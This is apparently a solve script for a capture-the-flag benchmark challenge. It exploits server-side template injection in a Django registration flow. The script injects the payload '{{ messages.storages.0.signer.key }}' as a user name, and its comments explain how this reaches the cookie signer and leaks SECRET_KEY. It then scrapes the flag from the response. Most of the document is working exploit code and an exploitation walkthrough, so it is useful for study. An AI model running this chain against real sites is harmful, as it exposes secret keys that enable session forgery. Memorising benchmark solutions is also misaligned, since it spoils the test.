#!/usr/bin/env bash
# XBEN-056-24 — "Art Gallery - Secrets" (tags: ssti, default_credentials)
#
# Step 3 of the registration builds its page by reading the template file and
# substituting the name from the session into it with `str.replace`, then
# compiling the result. The name is template *source*, so `{{ … }}` in it is
# evaluated.
#
# The only guard is that `%` is rejected at step 1, which rules out `{% … %}`
# and leaves expressions. Django expressions are deliberately weak — no calls
# with arguments, and no attribute whose name starts with `_` — so the usual
# `__globals__` route is closed.
#
# What is open is the `messages` context processor. It puts the message storage
# in the context; the storage is a `FallbackStorage` whose first backend is
# `CookieStorage`; a `CookieStorage` signs its cookie, so it holds a `Signer`;
# and a `Signer` built by `get_cookie_signer` keeps its key as
# `b"django.http.cookies" + settings.SECRET_KEY`. Every step of that is a plain
# attribute, and Django calls the no-argument properties on the way.
#
# `SECRET_KEY` here is `open('/flag.txt').read()`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben056-$$"
PAYLOAD='{{ messages.storages.0.signer.key }}'
[ "$#" -ge 2 ] && PAYLOAD="$2"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

fill() { "$H5I" browser type --selector "$1" "$2" --session "$SESSION" >/dev/null; }
# `button[type=submit]`, not `button`: the navbar's collapse toggle is the first
# button on the page and is not in the form.
next() { "$H5I" browser submit --selector 'button[type=submit]' --session "$SESSION" >/dev/null; }

"$H5I" browser open "$URL/accounts/register/step1/" --session "$SESSION" --new --capture >/dev/null
fill '#id_name' "$PAYLOAD"
fill '#id_password' 'Passw0rd!234'
next
fill '#id_email' "probe$$@example.com"
next

seq="$("$H5I" websec requests --session "$SESSION" | python3 -c '
import json, sys
rows = json.load(sys.stdin)["requests"]
print(max(r["seq"] for r in rows if "step3" in r["url"]))
')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
